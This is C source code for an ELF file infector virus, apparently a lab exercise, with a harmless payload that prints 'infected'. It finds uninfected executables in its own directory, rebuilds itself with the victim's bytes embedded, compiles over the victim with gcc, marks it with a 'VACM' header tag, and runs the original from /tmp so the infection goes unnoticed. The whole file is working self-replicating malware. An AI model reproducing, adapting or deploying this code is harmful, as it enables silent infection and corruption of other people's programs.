#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>
#include <string.h>
#include <unistd.h>
#include <sys/user.h>
#include <elf.h>
#include <errno.h>
#include <sys/types.h>
#include <dirent.h>
char buff[1<<20];
char code[1<<20];
void put_infected(char *filename){
	FILE *fp=fopen(filename,"r");
	int size=fread(buff,1,1<<20,fp);
	fclose(fp);	
	buff[EI_PAD]='V';
	buff[EI_PAD+1]='A';
	buff[EI_PAD+2]='C';
	buff[EI_PAD+3]='M';
	fp=fopen(filename,"w");
	fwrite(buff,1,size,fp);
	fclose(fp);				
}
int check(char *filename){

	FILE *fp=fopen(filename,"r");
	if(fp==NULL)return 1;
	int size=fread(buff,1,1<<20,fp);
	fclose(fp);	
	if(size>(1<<20))return 1;
	
	Elf64_Ehdr *ehdr=(Elf64_Ehdr*)buff;
	if(ehdr->e_ident[EI_MAG0]!=0x7f 
		||ehdr->e_ident[EI_MAG1]!='E'
		||ehdr->e_ident[EI_MAG2]!='L'
		||ehdr->e_ident[EI_MAG3]!='F')
	return 1;
	
			

	int flag=1;
	if(ehdr->e_ident[EI_PAD]!='V'
		||ehdr->e_ident[EI_PAD+1]!='A'
		||ehdr->e_ident[EI_PAD+2]!='C'
		||ehdr->e_ident[EI_PAD+3]!='M'){
			flag=0;
		}
		

		
	return flag;
	
}

//hello
int hellosize=8696;
char *hello="";

void run_old(){
	FILE *tmp=fopen("/tmp/_tmp","w");
	fwrite(hello,1,hellosize,tmp);
	fclose(tmp);
	system("chmod +x /tmp/_tmp");
	execl("/tmp/_tmp",0);
}
void bad(){
	puts("infected");
}
char victim[111];
void function1() {
	bad();
	char path[111],name[111];
	readlink("/proc/self/exe", path, sizeof(path));
	int len=strlen(path),i,j;
	for(i=len-1;i>=0;i--)if(path[i]=='/'){
		path[i]=0;
		for(j=i+1;j<len;j++)
			name[j-i-1]=path[j];
		name[len-i-1]=0;
		break;
	}
	DIR  *dir;
    struct    dirent    *ptr;
    
    int getvictim=0;
    dir = opendir(path);
    while((ptr = readdir(dir)) != NULL){
    	if(strcmp(name,ptr->d_name)){
	    	if(!check(ptr->d_name)){
				getvictim=1;
				strcpy(victim,ptr->d_name);	    
				fprintf(stderr,"victim is %s\n",victim);
				break;
	    	}
	    }
    }
    closedir(dir);
    
    if(!getvictim){
    	run_old();
    }
}
void function2() {
	FILE *newv=fopen("/tmp/_self","r");
	FILE *newc=fopen("__tmp.c","w");
	FILE *fv=fopen(victim,"r");
	int size=fread(code,1,1<<20,fv);
	if(size>(1<<20))run_old();
	
	
	fprintf(stderr,"infect %s\n",victim);
	int cur=0,i;
	while(fgets(buff,1<<20,newv)){
		if(cur==2){
			fprintf(newc,"int hellosize=%d;\n",size);
			cur--;
		}else if(cur==1){
			//char *hello="";
			fprintf(newc,"char *hello=\"");
			for(i=0;i<size;i++)
				fprintf(newc,"\\x%02x",((int)code[i])&255);
			fprintf(newc,"\";\n");
			cur--;
		}else fputs(buff,newc);
		if(strcmp(buff,"//hello\n")==0)cur=2;
	}
	
	fclose(newc);
	fclose(fv);
	fclose(newv);
	char cmd[111];
	sprintf(cmd,"gcc __tmp.c -o %s -g",victim);
	system(cmd);
	put_infected(victim);
	run_old();
}

